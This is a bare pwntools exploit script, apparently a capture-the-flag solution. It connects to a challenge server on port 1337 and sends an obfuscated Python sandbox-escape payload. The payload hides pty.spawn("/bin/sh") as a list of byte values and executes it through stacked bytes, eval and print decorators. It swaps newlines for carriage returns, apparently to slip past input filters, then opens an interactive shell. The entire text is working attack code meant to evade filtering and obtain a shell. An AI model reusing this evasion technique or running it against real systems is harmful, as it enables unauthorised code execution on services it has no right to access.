from pwn import *

io = connect('mooo.ex.sec-aau.dk', 1337)
io.read()

payload = """import pty
for x in [[112,116,121,46,115,112,97,119,110,40,34,47,98,105,110,47,115,104,34,41]]:
    for y in [lambda z: x]:
        @print
        @eval
        @bytes
        @y
        class z:
            pass"""
payload = payload.replace("\n", "\r")

io.sendline(payload)

io.interactive()
